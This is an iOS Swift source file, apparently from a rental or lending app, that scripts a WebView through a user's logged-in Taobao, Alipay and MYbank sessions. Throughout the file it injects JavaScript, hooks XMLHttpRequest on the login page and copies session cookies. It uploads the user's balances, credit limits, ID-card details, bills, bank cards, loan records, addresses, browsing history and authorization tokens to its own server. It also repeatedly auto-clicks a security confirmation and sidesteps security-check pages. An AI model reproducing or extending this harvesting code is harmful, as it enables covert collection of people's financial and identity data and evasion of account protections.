//
//  TaoBaoAuthorized+WK.swift
//  NiuNiuRent
//
//  Created by Q Z on 2023/7/12.
//

import UIKit
import WebKit

extension TaoBaoAuthorizedManager {
    /**我的支付宝信息
     * 余额宝1
     * 余额2
     * 花呗3
     */
    func upMyZfbInfo(url: String?, t1: String, t2: String, type: Int) {
        log.info("upMyZfbInfo上报数据: " + t1 + "类型: \(type)")
        if type == 1 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "yuebao")
        } else if type == 2 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "yue")
        } else if type == 3 {
            PostDataDTO.shared.postData(path: "index_money", content: t1, type: "huabei")
            PostDataDTO.shared.postData(path: "index_money", content: t2, type: "huabei_total")
        }
    }
    
    /// 淘宝实名认证
    func tbAuthenticationName(url: String?, name: String, idCard: String) {
        log.info("淘宝实名认证: \(url ?? "")" + "name: \(name)")
        if url?.contains("https://member1.taobao.com/member/fresh/certify%20info.htm") == true{
            let body = ["name": name, "idcard": idCard]
            PostDataDTO.shared.postData(path: "index_money", content: body.toJson(), type: "taobao_auth_user")
        }
    }
    
    /// 账单
    func upBill(url: String?, body: String, sizeMonth: String) {
        log.info("upBill账单明细: \(url ?? "")" + "月数: \(sizeMonth)")
        if url?.contains("https://consumeprod.alipay.com/record/standard.htm") == true{
            if sizeMonth == "3" {
                PostDataDTO.shared.postData(path: "three_month_repay", content: body)
            } else {
                PostDataDTO.shared.postData(path: "alipay_money", content: body, month: "\(sizeMonth)")
            }
        }
    }
    
    func showHtml(url: String?, body: String) {
        log.info("⚠️⚠️⚠️⚠️showHtml⚠️⚠️⚠️⚠️)")
        //网商个人信息
        if url?.contains("loan/profile.htm") == true {
            PostDataDTO.shared.postData(path: "bank_profile", content: body)
        }
        
        //网商还款信息
        if url?.hasPrefix("https://loanweb.mybank.cn/repay/home.html") == true {
            PostDataDTO.shared.postData(path: "bank_repay", content: body)
        }
        
        //网商借款信息
        if url?.hasPrefix("https://loanweb.mybank.cn/repay/record.html") == true {
            PostDataDTO.shared.postData(path: "bank_record", content: body)
        }
        
        // 淘宝地址
        if url?.contains("deliver_address.htm") == true {
            PostDataDTO.shared.postData(path: "address", content: body)
        }
        
        // 我的足迹 footmark/tbfoot
        if url?.contains("footmark/tbfoot") == true {
            PostDataDTO.shared.postData(path: "foot_mark", content: body)
        }
        
        //账号信息 account/index.htm
        if url?.contains("https://custweb.alipay.com/account/index.htm") == true {
            PostDataDTO.shared.postData(path: "parse_alipay_base_info", content: body)
        }
        
        //金额统计
        if url?.contains("https://consumeprod.alipay.com/record/standard.htm") == true {
            if body.hasPrefix("已支出") == true {
                PostDataDTO.shared.postData(path: "alipay_money", content: body)
            }
        }
        
        // 绑卡信息https://zht.alipay.com/asset/bankList.htm
        if url?.contains("asset/bankList.htm") == true {
            PostDataDTO.shared.postData(path: "bind_bank", content: body)
        }
    }
}

extension TaoBaoAuthorizedManager {
    func getTBHtml() {
        let addressJS = "var url = window.location.href;" +
        "var body = document.getElementsByTagName('html')[0].outerHTML;" +
        "var data = {\"url\":url,\"html\":body};" +
        "window.webkit.messageHandlers.trackTbUrl.postMessage(data);"
        evaluateJavaScript(addressJS)
    }
    
    func loginSuccess(webView: WKWebView, absoluteString: String?) {
        getAllCookies(webView: webView, type: .memberInfoURL) { cook in
            DispatchQueue.global().async {
                TaoBaoSpider.shared.requestAlipay(type: .memberInfoURL)
                TaoBaoSpider.shared.requestAlipay(type: .userName)
            }
        }
    }
    
    func getOrders(webView: WKWebView, absoluteString: String?) {
        getAllCookies(webView: webView, type: .ordersURL) { [weak self] cook in
            TaoBaoSpider.shared.requestAlipay(type: .ordersURL) { [weak self] orderHtml in
                if let orderHtml = orderHtml {
                    DispatchQueue.main.async { [weak self] in
                        self?.parseOrderDetails(orderHtml: orderHtml, absoluteString: absoluteString)
                    }
                }
            }
        }
    }
    
    // 应用授权
    func getAuthTokenManage(webView: WKWebView) {
        self.actionType = "应用授权"
        self.trackTbUrl(url: webView.url?.absoluteString ?? "", html: "")
        self.getAllCookies(webView: webView, type: .tokenManageURL) { _ in
            TaoBaoSpider.shared.requestAlipay(type: .tokenManageURL) { [weak self] content in
                if let content = content {
                    let startStr = "下一页&gt;</a>\n                <a href=\"https://openauth.alipay.com:443/auth/tokenManage.htm?pageNo="
                    let endStr = "\">尾页&gt;&gt;</a>\n"
                    let startIdx = content.range(of: startStr, options: .literal)?.upperBound
                    let endIdx = content.range(of: endStr, options: .literal)?.lowerBound
                    if let startIdx = startIdx, let endIdx = endIdx {
                        let page = content[startIdx..<endIdx]
                        self?.getAccreditData(webView: webView, totalPage: Int(page) ?? 0)
                    }
                }
            }
        }
    }
    
    /// 授权列表
    func getAccreditData(webView: WKWebView, totalPage: Int) {
        getAllCookies(webView: webView, type: .tokenManageURL) { cook in
            DispatchQueue.global().async {
                for idx in 2...totalPage {
                    Thread.sleep(forTimeInterval: 0.1)
                    TaoBaoSpider.shared.requestAlipay(url: TaoBaoSpider.shared.tokenManageURL + "?pageNo=\(idx)", type: .tokenManageURL)
                }
            }
        }
    }
    
    func parseOrderDetails(orderHtml: String, absoluteString: String?) {
        log.info("==========订单列表信息===========:\(orderHtml)")
        self.actionType = "订单列表"
        self.trackTbUrl(url: "https://buyertrade.taobao.com/trade/itemlist/list_bought_items.htm", html: orderHtml)
        let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
        var orderHtmlString = orderHtml.components(separatedBy: "JSON.parse('")[safe: 1]
        orderHtmlString = orderHtmlString?.components(separatedBy: "');")[safe: 0]
        orderHtmlString = orderHtmlString?.replacingOccurrences(of: "\\\"", with: "\"")
        let dic = orderHtmlString?.toDictionary()
        let array = dic?["mainOrders"] as? [[String: Any]]
        var index = 1;
        array?.forEach({ [weak self] obj in
            if index <= 10{
                if #available(iOS 13.0, *) {
                    Task {
                        let statusInfo = obj["statusInfo"] as? [String: Any]
                        if let orderUrl = statusInfo?["url"] as? String,
                           let url = URL(string: "https:" + orderUrl) {
                            self?.getOrderDetail(url)
                        }
                    }
                } else {
                    let statusInfo = obj["statusInfo"] as? [String: Any]
                    if let orderUrl = statusInfo?["url"] as? String,
                       let url = URL(string: "https:" + orderUrl) {
                        self?.getOrderDetail(url)
                    }
                }
            } else {
                return
            }
            index = index + 1
        })
    }
    
    func getOrderDetail(_ url: URL) {
        let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
        cookieStore.getAllCookies({ [weak self] cook in
            guard let `self` = self else { return }
            self.cookieArray = cook
            self.storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
            TaoBaoSpider.shared.requestAlipay(url: url.absoluteString, type: .ordersDetailURL)
        })
    }
    
    func getAddress(webView: WKWebView, absoluteString: String?) {
        self.getAddress = true
        self.actionType = "登录成功"
        self.loadUrlStr("https://member1.taobao.com/member/fresh/deliver_address.htm")
    }
    
    func clickTBQrcode(webView: WKWebView){
        if webView.url?.absoluteString.hasSuffix("https://login.taobao.com/") == true{
            let injectionJSString = "(function() {\n" +
            "    var origOpen = XMLHttpRequest.prototype.open;var url = arguments[1];\n"  +
            "    XMLHttpRequest.prototype.open = function() {\n"  +
            "        this.addEventListener('load', function() {\n"  +
            "            var data = {\"url\":url,\"responseText\":this.responseText};  \n" +
            "            window.webkit.messageHandlers.ajaxDone.postMessage(data);  \n" +
            "        });\n"  +
            "        origOpen.apply(this, arguments);\n"  +
            "    };\n"  +
            "})();"
            self.actionType = "点击二维码"
            evaluateJavaScript(injectionJSString)
            /// 点击二维码
            let clickJs = "document.getElementsByClassName(\"icon-qrcode\")[0].click();"
            evaluateJavaScript(clickJs)
        }
    }
    // 我的足迹
    func getTbfoot(webView: WKWebView, absoluteString: String?)  {
        if absoluteString?.hasPrefix("https://member1.taobao.com/member/fresh/deliver_address.htm") == true{
            self.actionType = "收获地址"
            let addressJS = "var url = window.location.href;" +
            "var address = document.getElementsByClassName(\"next-table-body\")[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":address};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            // [步骤3] 从 收货地址界面  跳转到   足迹界面
            self.loadUrlStr("https://www.taobao.com/markets/footmark/tbfoot")
        }
    }
    
    // 重新跳转到淘宝个人界面
    func getTbHome(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://www.taobao.com/markets/footmark/tbfoot") == true{
            self.actionType = "我的足迹"
            
            let addressJS = "var url = window.location.href;" +
            "var address = document.getElementsByClassName('J_ModContainer')[1].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":address};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            
            evaluateJavaScript(addressJS)
            // [步骤4] 重新跳转到淘宝个人界面
            self.loadUrlStr("https://i.taobao.com/my_taobao.htm")
        }
    }
    // 网商信息 start
    func getWSMsg(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://login.mybank.cn/login/loginhome.htm") == true{
            self.actionType = "网商贷"
            log.info("网商登录")
            let WSMsg = "document.getElementsByClassName(\"userName___1vTUS\")[0].getElementsByTagName(\"span\")[0].click();\n" +
            "setTimeout(function () {\n" +
            "\tdocument.getElementsByClassName(\"logoLoad___78Syr\")[0].click();\n" +
            "},3000);"
            evaluateJavaScript(WSMsg)
        }
    }
    
    // 网商个人信息
    func getWSHome(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://loan.mybank.cn/loan/profile.htm") == true || absoluteString?.hasPrefix("https://loanweb.mybank.cn/loan.html") == true{
            self.actionType = "网商贷"
            self.evaluateJavaScript(getHtmlJS)
            log.info("网商登录成功，进入个人信息")
            self.loadUrlStr("https://loanweb.mybank.cn/repay/home.html")
        }
    }
    
    // 网商还款信息
    func getWSRepayHome(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://loanweb.mybank.cn/repay/home.html") == true{
            self.actionType = "网商还款信息"
            
            evaluateJavaScript(getHtmlJS)
            log.info("网商个人信息，进入还款信息")
            self.loadUrlStr("https://loanweb.mybank.cn/repay/record.html")
        }
    }
    
    // 网商借款信息
    func getWSRepayRecord(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://loanweb.mybank.cn/repay/record.html") == true{
            self.actionType = "网商借款信息"
            evaluateJavaScript(getHtmlJS)
        }
    }
    
    // 网商信息 end
    func getSwitchPersonal(webView: WKWebView, absoluteString: String?) {
        self.actionType = "商家平台首页"
        if absoluteString?.hasPrefix("https://b.alipay.com/page/home") == true{
            for idx in 1...10 {
                log.info("商家平台首页\(idx)")
                Thread.sleep(forTimeInterval: 0.5)
                if idx <= 5 {
                    self.loadUrlStr("https://shanghu.alipay.com/home/switchPersonal.htm")
                } else {
                    self.loadUrlStr("https://uemprod.alipay.com/home/switchPersonal.htm")
                }
            }
        }
    }
    
    // 支付宝信息 start
    func getZFBAccount(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://my.alipay.com/portal/i.htm") == true || absoluteString?.hasPrefix("https://personalweb.alipay.com/portal/i.htm") == true{
            /// 回收站
            self.getPageData(webView: webView, type: .trashURL)
            
            /// 支付宝消息列表
            self.getPageData(webView: webView, type: .messageURL)
            self.actionType = "进入支付宝成功"
            log.info("进入支付宝成功")
            //点击花呗余额
            let huabeiJS = "document.getElementById(\"showHuabeiAmount\").click();" +
            "setTimeout(function(){\n" +
            "var url = window.location.href;\n" +
            "var text1 = document.querySelector(\"#account-amount-container\").textContent;\n" +
            "var text2 = document.querySelector(\"#credit-amount-container\").textContent;\n" +
            "var data = {\"url\":url,\"t1\":text1,\"t2\":text2,\"type\":3};" +
            "window.webkit.messageHandlers.upMyZfbInfo.postMessage(data);\n" +
            "},100);"
            evaluateJavaScript(huabeiJS)
            Thread.sleep(forTimeInterval: 0.1)
            
            self.loadUrlStr("https://yebprod.alipay.com/yeb/purchase.htm")
        }
    }
    /// 需要支付宝登录
    func needAliPayLogin(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.contains(find: "alipay.com/login/trustLoginResultDispatch.htm") == true{
            log.info("需要支付宝登录")
            self.actionType = "需要支付宝登录"
            self.webViewGoBack()
        }
    }
    
    // 进入余额宝
    func getYebPurchase(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://yebprod.alipay.com/yeb/purchase.htm") == true {
            self.actionType = "进入余额宝"
            //点击账户余额宝
            let yueb =
            "var url = window.location.href;\n" +
            "var text = document.querySelector(\"#J_vailableQuotient\").textContent;\n" +
            "var data = {\"url\":url,\"t1\":text,\"t2\":text,\"type\":1};" +
            "window.webkit.messageHandlers.upMyZfbInfo.postMessage(data);\n"
            evaluateJavaScript(yueb)
            Thread.sleep(forTimeInterval: 0.1)
            //点击账户余额
            let yue =
            "var url = window.location.href;\n" +
            "var text = document.querySelector(\"#J_fundPurchaseForm > div:nth-child(4) > p > span\").textContent;\n" +
            "var data = {\"url\":url,\"t1\":text,\"t2\":text,\"type\":2};" +
            "window.webkit.messageHandlers.upMyZfbInfo.postMessage(data);\n"
            evaluateJavaScript(yue)
            Thread.sleep(forTimeInterval: 0.1)
            
            aliIndex = true
            self.loadUrlStr("https://custweb.alipay.com/account/index.htm")
        }
    }
    
    // 支付宝交易记录
    func getRecordStandard(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://consumeprod.alipay.com/record/standard.htm") == true {
            self.actionType = "支付宝交易记录"
            
            log.info("进入交易记录")
            Thread.sleep(forTimeInterval: 0.1)
            upBill(currMonth: "1", absoluteString: absoluteString)
            Thread.sleep(forTimeInterval: 0.75)
            
            var jS = "document.querySelector(\"#J-three-month\").click();"
            evaluateJavaScript(jS)
            Thread.sleep(forTimeInterval: 0.1)
            upBill(currMonth: "3", absoluteString: absoluteString)
            Thread.sleep(forTimeInterval: 0.75)
            
            jS = "document.querySelector(\"#J-one-year\").click();"
            evaluateJavaScript(jS)
            Thread.sleep(forTimeInterval: 0.1)
            upBill(currMonth: "12", absoluteString: absoluteString)
            Thread.sleep(forTimeInterval: 0.75)
            
            self.loadUrlStr("https://loan.mybank.cn/loan/profile.htm")
        }
        
        if zhifubao == true && absoluteString?.hasPrefix("https://consumeprod.alipay.com/record/checkSecurity.htm") == true {
            self.loadUrlStr("https://custweb.alipay.com/account/index.htm")
        }
        
        func upBill(currMonth: String, absoluteString: String?){
            var monthJs = "var data = {\"url\":url,\"responseText\":address,\"currMonth\": 1};"
            if currMonth == "3" {
                monthJs = "var data = {\"url\":url,\"responseText\":address,\"currMonth\": 3};"
            }
            if currMonth == "12" {
                monthJs = "var data = {\"url\":url,\"responseText\":address,\"currMonth\": 12};"
            }
            let addressJS = "document.getElementsByClassName(\"action-content\")[0].getElementsByClassName(\"amount-links\")[0].click();" +
            "setTimeout(function(){\n" +
            "var url = window.location.href;\n" +
            "var address = document.getElementsByClassName(\"amount-detail\")[0].innerHTML;\n" +
            monthJs +
            "window.webkit.messageHandlers.showHtml.postMessage(data);" +
            //上报明细
            "window.webkit.messageHandlers.upBill.postMessage(data);" +
            "},500);"
            evaluateJavaScript(addressJS)
        }
    }
    
    // 阿里基本信息
    func getAliBaseMsg(webView: WKWebView, absoluteString: String?) {
        if zhifubao == true &&
            absoluteString?.hasPrefix("https://custweb.alipay.com/account/index.htm") == true {
            self.actionType = "我的支付宝"
            log.info("阿里基本信息")
            let addressJS = "var url = window.location.href;" +
            "var body = document.getElementsByTagName('html')[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":body};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            if aliIndex == true {
                /// 应用授权
                self.getAuthTokenManage(webView: webView)
                /// 阿里代扣
                self.getPageData(webView: webView, type: .aliWithholdingURL)
                
                self.loadUrlStr("https://zht.alipay.com/asset/bankList.htm")
            } else {
                self.loadUrlStr("https://my.alipay.com/portal/i.htm")
            }
        }
    }
    
    // 绑卡信息https://zht.alipay.com/asset/bankList.htm
    func getÅssetBankList(webView: WKWebView, absoluteString: String?) {
        if zhifubao == true &&
            absoluteString?.hasPrefix("https://zht.alipay.com/asset/bankList.htm") == true {
            self.actionType = "绑卡信息"
            
            Thread.sleep(forTimeInterval: 0.5)
            let addressJS = "var url = window.location.href;" +
            "var body = document.getElementsByClassName(\"card-box-list\")[0].outerHTML;" +
            "var data = {\"url\":url,\"responseText\":body};" +
            "window.webkit.messageHandlers.showHtml.postMessage(data);"
            evaluateJavaScript(addressJS)
            self.loadUrlStr("https://consumeprod.alipay.com/record/standard.htm")
        }
    }
    
    // 支付宝加载失败
    func getAlipayError(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://auth.alipay.com/error") == true || absoluteString?.hasPrefix("https://render.alipay.com/p/s/alipay_site/wait") == true  {
            log.info("支付宝加载失败")
            self.actionType = "支付宝加载失败"
            self.webViewGoBack()
        }
        
        if absoluteString?.hasPrefix("https://authstl.alipay.com/login/trustLoginResultDispatch.htm") == true{
            // 需要点击蓝色按钮， J-submit-cert-check
            self.actionType = "需要点击蓝色按钮"
            for idx in 1...10 {
                log.info("蓝色按钮\(idx)")
                let gotoAliJS = "document.getElementById(\"J-submit-cert-check\").click()"
                evaluateJavaScript(gotoAliJS)
                Thread.sleep(forTimeInterval: 0.5)
                if idx == 10 {
                    self.trackTbUrl(url: "https://authstl.alipay.com/login/trustLoginResultDispatch.htm", html: "document.getElementById(\"J-submit-cert-check\").click()")
                    self.webViewGoBack()
                }
            }
        }
    }
    
    func getCheckSecurity(webView: WKWebView, absoluteString: String?) {
        if absoluteString?.hasPrefix("https://consumeprod.alipay.com/errorSecurity.htm") == true || absoluteString?.hasPrefix("https://consumeprod.alipay.com/record/checkSecurity.htm") == true  {
            log.info("出现支付宝扫码")
            self.actionType = "出现支付宝扫码"
            scanNum += 1
            if scanNum <= 3 {
                self.trackTbUrl(url: absoluteString ?? "", html: "")
                self.webViewGoBack()
            } else {
                self.actionType = "网商贷"
                self.loadUrlStr("https://loan.mybank.cn/loan/profile.htm")
            }
        }
    }
    
    func getPageData(webView: WKWebView, type: TaoBaoSpiderType) {
        self.getAllCookies(webView: webView, type: type) { cook in
            Thread.sleep(forTimeInterval: 0.1)
            DispatchQueue.global().async {
                self.actionType = type.desc
                self.trackTbUrl(url: type.rawValue, html: "")
                TaoBaoSpider.shared.requestAlipay(type: type)
            }
        }
    }
    
    func getAllCookies(webView: WKWebView, type: TaoBaoSpiderType, callback: @escaping ([HTTPCookie]) -> Void){
        DispatchQueue.main.async {
            let cookieStore = webView.configuration.websiteDataStore.httpCookieStore
            cookieStore.getAllCookies({ [weak self] cook in
                guard let `self` = self else { return }
                self.cookieArray = cook
                if let url = URL(string: type.rawValue) {
                    self.storage.setCookies(self.cookieArray, for: url, mainDocumentURL: nil)
                    callback(cook)
                }
            })
        }
    }
    
    func webViewGoBack() {
        DispatchQueue.main.async { [weak self] in
            self?.webView.goBack()
        }
    }
    
    func evaluateJavaScript(_ jsStr: String) {
        DispatchQueue.main.async { [weak self] in
            self?.webView.evaluateJavaScript(jsStr){ data, error in}
        }
    }
    
    func loadUrlStr(_ urlStr: String) {
        DispatchQueue.main.async { [weak self] in
            let url = URL(string: urlStr)!
            let request =  URLRequest(url: url)
            self?.webView.load(request)
        }
    }
}
